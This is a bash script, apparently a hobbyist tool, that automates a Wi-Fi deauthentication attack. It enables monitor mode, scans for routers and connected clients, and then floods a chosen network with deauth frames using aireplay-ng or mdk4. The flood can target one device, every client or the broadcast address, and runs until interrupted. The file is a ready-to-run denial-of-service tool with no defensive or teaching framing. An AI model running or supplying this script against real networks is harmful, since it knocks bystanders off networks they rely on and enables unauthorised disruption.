#!/bin/bash

clear
echo " AUTO DEAUTH ATTACK SCRIPT "
echo ""

# ---------------------------
# STEP 1: SETUP MONITOR MODE
# ---------------------------
echo "Setting up Monitor Mode"
echo "-------------------------------"

# Kill interfering processes
echo "[*] Stopping network services..."
sudo airmon-ng check kill > /dev/null 2>&1

# Get Wi-Fi interface
echo "[*] Available Wi-Fi interfaces:"
ip link show | grep -E "^[0-9]+:" | grep -v "lo:" | awk -F': ' '{print $2}' | grep -E "^wl|^wlan"
echo ""

read -p "Enter Wi-Fi interface (default: wlan0): " INTERFACE
INTERFACE=${INTERFACE:-wlan0}

# Enable monitor mode
echo "[*] Enabling monitor mode on $INTERFACE..."
sudo airmon-ng start $INTERFACE > /dev/null 2>&1
MON_INTERFACE="${INTERFACE}mon"

echo "[✓] Monitor mode enabled: $MON_INTERFACE"
echo ""

# ---------------------------
# STEP 2: SCAN NETWORKS
# ---------------------------
echo "Scanning Networks"
echo "------------------------"
echo "[*] Scanning for 10 seconds..."
echo ""

# Run airodump-ng to show networks
timeout 10 sudo airodump-ng $MON_INTERFACE

echo ""
echo "[✓] Scan completed"
echo ""

# ---------------------------
# STEP 3: SELECT ROUTER
# ---------------------------
echo "Select Target Router"
echo "---------------------------"
read -p "Enter Router BSSID (MAC) from list above: " ROUTER_MAC

# Validate MAC format
if [[ ! $ROUTER_MAC =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
    echo "[!] Invalid MAC format! Using: $ROUTER_MAC"
    echo "    Continuing anyway..."
fi

# Get channel
read -p "Enter Channel number from scan: " CHANNEL

echo ""
echo "[✓] Selected Router: $ROUTER_MAC"
echo "[✓] Channel: $CHANNEL"
echo ""

# ---------------------------
# STEP 4: SCAN CONNECTED DEVICES
# ---------------------------
echo "Scan Connected Devices"
echo "-----------------------------"
echo "[*] Scanning for connected devices..."
echo "    This will take 10 seconds..."
echo ""

# Set to correct channel
sudo iwconfig $MON_INTERFACE channel $CHANNEL > /dev/null 2>&1

# Scan for connected devices
timeout 10 sudo airodump-ng --bssid $ROUTER_MAC --channel $CHANNEL $MON_INTERFACE

echo ""
echo "[✓] Device scan completed"
echo ""

# ---------------------------
# STEP 5: SELECT TARGET OPTION
# ---------------------------
echo "Select Attack Target"
echo "---------------------------"
echo "Options:"
echo "  1. Attack specific device (enter MAC)"
echo "  2. Attack ALL devices on network"
echo "  3. Attack broadcast (most advanced)"
echo ""

read -p "Select option (1/2/3): " OPTION

case $OPTION in
    1)
        read -p "Enter device MAC to attack: " TARGET_MAC
        ATTACK_CMD="sudo aireplay-ng --deauth 0 -a $ROUTER_MAC -c $TARGET_MAC $MON_INTERFACE"
        echo "[*] Will attack specific device: $TARGET_MAC"
        ;;
    2)
        ATTACK_CMD="sudo aireplay-ng --deauth 0 -a $ROUTER_MAC $MON_INTERFACE"
        echo "[*] Will attack ALL devices on network"
        ;;
    3)
        ATTACK_CMD="sudo mdk4 $MON_INTERFACE d -b $ROUTER_MAC"
        echo "[*] Will use broadcast attack (most aggressive)"
        # Install mdk4 if not present
        if ! command -v mdk4 &> /dev/null; then
            echo "[*] Installing mdk4..."
            sudo apt update && sudo apt install mdk4 -y
        fi
        ;;
    *)
        echo "[!] Invalid option! Defaulting to attack all devices"
        ATTACK_CMD="sudo aireplay-ng --deauth 0 -a $ROUTER_MAC $MON_INTERFACE"
        ;;
esac

echo ""

# ---------------------------
# STEP 6: START ATTACK
# ---------------------------
echo "Starting Attack"
echo "----------------------"
echo "[!] ATTACK STARTING IN 3 SECONDS..."
echo "[!] Press Ctrl+C to stop attack and restore network"
echo ""

for i in {3..1}; do
    echo "Starting in $i..."
    sleep 1
done

echo ""
echo "        ATTACK RUNNING             "
echo " PRESS Ctrl+C TO STOP ATTACK "
echo ""

# Run the attack
echo "[*] Executing: $ATTACK_CMD"
echo ""
eval $ATTACK_CMD

# ---------------------------
# CLEANUP (runs after Ctrl+C)
# ---------------------------
echo ""
echo "[*] Ctrl+C pressed! Stopping attack..."
echo ""

# Kill any remaining attack processes
sudo pkill -f aireplay-ng
sudo pkill -f mdk4

# Stop monitor mode
echo "[*] Disabling monitor mode..."
sudo airmon-ng stop $MON_INTERFACE > /dev/null 2>&1
sudo airmon-ng stop $INTERFACE > /dev/null 2>&1

# Restore network services
echo "[*] Restoring network services..."
sudo systemctl restart NetworkManager
sudo systemctl restart wpa_supplicant

# Enable Wi-Fi if disabled
sudo rfkill unblock wifi

echo ""
echo "[✓] ATTACK STOPPED"
echo "[✓] Monitor mode disabled"
echo "[✓] Network restored to MANAGED MODE"
echo "[✓] Wi-Fi should now work normally"
echo ""
echo "Script completed!"
